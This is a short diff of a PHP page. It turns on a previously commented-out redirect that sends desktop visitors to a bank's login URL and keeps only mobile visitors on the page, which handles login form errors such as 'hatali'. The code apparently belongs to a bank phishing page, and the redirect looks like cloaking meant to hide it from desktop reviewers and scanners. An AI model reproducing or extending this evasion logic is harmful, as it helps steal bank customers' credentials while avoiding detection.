@@ -12,12 +12,10 @@ function isMobileRequest(): bool
     return (bool) preg_match('/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|windows phone/', $userAgent);
 }
 
-/*
 if (!isMobileRequest() && shouldRedirectDesktopToBank()) {
     header('Location: ' . DESKTOP_BANK_LOGIN_URL);
     exit;
 }
-*/
 
 $errors = $_SESSION['form_errors'] ?? [];
 if (($_GET['error'] ?? '') === 'hatali') {
